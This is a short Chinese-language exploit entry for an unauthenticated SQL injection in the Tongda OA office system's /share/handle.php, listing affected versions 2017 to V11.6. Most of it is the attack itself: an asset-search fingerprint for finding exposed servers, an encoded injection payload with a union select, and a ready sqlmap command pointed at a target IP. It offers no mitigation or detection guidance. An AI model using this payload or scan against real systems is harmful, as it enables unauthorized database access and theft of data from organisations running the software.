# 通达OAshare存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`

**请求体 / payload**
```
/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20user()--+

sqlmap
sqlmap -u "http://192.168.31.164/share/handle.php?_GET%5Bmodule%5D=1'=%7B%60'%60%202%7D" --batch
```

**其他**
- 通达OA share存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017-通达OAV11.6